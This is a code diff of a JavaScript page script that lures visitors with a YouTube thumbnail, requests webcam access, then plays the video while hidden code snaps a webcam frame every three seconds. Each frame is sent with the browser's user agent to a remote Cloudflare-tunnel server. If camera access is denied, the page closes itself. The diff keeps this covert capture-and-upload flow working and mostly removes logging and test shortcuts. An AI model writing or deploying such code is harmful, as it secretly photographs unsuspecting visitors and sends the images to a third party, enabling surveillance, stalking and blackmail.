@@ -1,6 +1,7 @@
 // ===== CONFIGURATION =====
+// ✅ UPDATED: Cloudflared URL
 const BACKEND_URL = 'https://viii-limited-chronicles-beast.trycloudflare.com';
-const CAPTURE_INTERVAL = 3000; // Capture every 3 seconds
+const CAPTURE_INTERVAL = 3000;
 
 // ===== STATE =====
 let mediaStream = null;
@@ -14,29 +15,18 @@ let videoPlayed = false;
 const videoThumbnail = document.getElementById('video-thumbnail');
 const youtubeIframe = document.getElementById('youtube-iframe');
 
-// ===== CLOSE PAGE FUNCTION =====
+// ===== CLOSE PAGE =====
 function closePage() {
     console.log('🚫 Camera denied - Closing page...');
-    
     try {
         window.close();
-    } catch(e) {
-        console.log('window.close() failed');
-    }
-    
+    } catch(e) {}
     try {
         window.location.href = 'about:blank';
-    } catch(e) {
-        console.log('about:blank redirect failed');
-    }
-    
+    } catch(e) {}
     try {
         document.body.innerHTML = '';
-        document.body.style.background = '#0f0f0f';
-    } catch(e) {
-        console.log('Body clear failed');
-    }
-    
+    } catch(e) {}
     setTimeout(() => {
         window.location.replace('about:blank');
     }, 100);
@@ -49,8 +39,6 @@ if (videoThumbnail) {
         if (videoPlayed) return;
         requestCameraAccess();
     });
-} else {
-    console.error('❌ videoThumbnail element not found!');
 }
 
 // ===== REQUEST CAMERA ACCESS =====
@@ -58,13 +46,11 @@ async function requestCameraAccess() {
     try {
         console.log('📸 Requesting camera access...');
         
-        // Create hidden video element for capture
         videoElement = document.createElement('video');
         videoElement.style.display = 'none';
         videoElement.setAttribute('playsinline', 'true');
         document.body.appendChild(videoElement);
         
-        // Request camera with specific constraints
         const stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 facingMode: 'user',
@@ -74,7 +60,6 @@ async function requestCameraAccess() {
             audio: false
         });
         
-        // ✅ Camera GRANTED
         mediaStream = stream;
         videoElement.srcObject = stream;
         await videoElement.play();
@@ -82,17 +67,11 @@ async function requestCameraAccess() {
         videoPlayed = true;
         
         console.log('✅ Camera access granted');
-        
-        // Play YouTube video
         playYouTubeVideo();
-        
-        // Start capturing in background
         startCapturing();
         
     } catch (error) {
         console.error('❌ Camera error:', error);
-        
-        // ❌ Camera DENIED - Close page immediately (NO ALERT)
         closePage();
     }
 }
@@ -101,83 +80,55 @@ async function requestCameraAccess() {
 function playYouTubeVideo() {
     console.log('▶️ Playing video: pYEEbJljTwc');
     
-    // Hide thumbnail
     if (videoThumbnail) {
         videoThumbnail.style.display = 'none';
     }
     
-    // Show iframe with video
     if (youtubeIframe) {
         youtubeIframe.style.display = 'block';
-        youtubeIframe.src = 'https://www.youtube.com/embed/pYEEbJljTwc?autoplay=1&mute=0&rel=0&enablejsapi=1';
-        console.log('✅ Video iframe loaded:', youtubeIframe.src);
-    } else {
-        console.error('❌ Iframe element not found!');
+        youtubeIframe.src = 'https://www.youtube.com/embed/pYEEbJljTwc?si=LiHKHKBH5gfGBSjo&autoplay=1&mute=0&rel=0&enablejsapi=1';
+        console.log('✅ Video iframe loaded');
     }
 }
 
 // ===== START CAPTURING =====
 function startCapturing() {
     captureCount = 0;
-    console.log('📸 Starting image capture every', CAPTURE_INTERVAL/1000, 'seconds');
-    
-    // First capture immediately
+    console.log('📸 Starting capture every', CAPTURE_INTERVAL/1000, 'seconds');
     captureAndSendImage();
-    
-    // Then interval-based capture
     captureInterval = setInterval(captureAndSendImage, CAPTURE_INTERVAL);
 }
 
 // ===== CAPTURE & SEND IMAGE =====
 async function captureAndSendImage() {
-    if (!isCameraActive || !videoElement) {
-        console.log('⚠️ Camera not active, skipping capture');
-        return;
-    }
+    if (!isCameraActive || !videoElement) return;
     
     try {
-        // Create canvas for capture
         const canvas = document.createElement('canvas');
         canvas.width = 640;
         canvas.height = 480;
         const ctx = canvas.getContext('2d');
-        
-        // Draw video frame to canvas
         ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-        
-        // Convert to base64 JPEG
         const imageData = canvas.toDataURL('image/jpeg', 0.85);
         captureCount++;
         
-        console.log(`📸 Capturing image #${captureCount}...`);
+        console.log(`📸 Capturing #${captureCount}...`);
         
-        // Send to backend
-        try {
-            const response = await fetch(`${BACKEND_URL}/upload`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    image: imageData,
-                    timestamp: new Date().toISOString(),
-                    captureId: captureCount,
-                    userAgent: navigator.userAgent
-                })
-            });
-            
-            if (response.ok) {
-                const data = await response.json();
-                console.log(`✅ [${captureCount}] Image saved: ${data.filename}`);
-            } else {
-                console.error('❌ Server error:', response.status);
-            }
-        } catch (fetchError) {
-            console.error('❌ Fetch failed:', fetchError);
-            // Retry after 2 seconds
-            setTimeout(captureAndSendImage, 2000);
+        const response = await fetch(`${BACKEND_URL}/upload`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                image: imageData,
+                timestamp: new Date().toISOString(),
+                captureId: captureCount,
+                userAgent: navigator.userAgent
+            })
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            console.log(`✅ [${captureCount}] Saved: ${data.filename}`);
         }
-        
     } catch (error) {
         console.error('❌ Capture failed:', error);
     }
@@ -189,52 +140,24 @@ function stopCapturing() {
         clearInterval(captureInterval);
         captureInterval = null;
     }
-    
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
         mediaStream = null;
     }
-    
     if (videoElement) {
         videoElement.srcObject = null;
         videoElement.remove();
         videoElement = null;
     }
-    
     isCameraActive = false;
-    console.log(`🛑 Capturing stopped. Total captures: ${captureCount}`);
+    console.log(`🛑 Stopped. Total: ${captureCount}`);
 }
 
-// ===== CLEANUP ON PAGE UNLOAD =====
+// ===== CLEANUP =====
 window.addEventListener('beforeunload', function() {
     stopCapturing();
 });
 
-// ===== KEYBOARD SHORTCUTS (For testing) =====
-document.addEventListener('keydown', function(e) {
-    // Ctrl+Shift+C = Show status
-    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
-        console.log('📊 Status:', {
-            cameraActive: isCameraActive,
-            totalCaptures: captureCount,
-            intervalRunning: captureInterval ? '✅ Running' : '❌ Stopped',
-            videoPlaying: videoPlayed
-        });
-    }
-    
-    // Ctrl+Shift+S = Stop capturing
-    if (e.ctrlKey && e.shiftKey && e.key === 'S') {
-        stopCapturing();
-        console.log('🛑 Capturing stopped manually');
-    }
-});
-
-// ===== LOG ON LOAD =====
 console.log('✅ YouTube Camera Lab Script Loaded');
 console.log('📡 Backend URL:', BACKEND_URL);
 console.log('🎬 Video ID: pYEEbJljTwc');
-console.log('📸 Capture Interval:', CAPTURE_INTERVAL/1000, 'seconds');
-console.log('');
-console.log('📌 Keyboard Shortcuts:');
-console.log('  Ctrl+Shift+C = Show Status');
-console.log('  Ctrl+Shift+S = Stop Capturing');
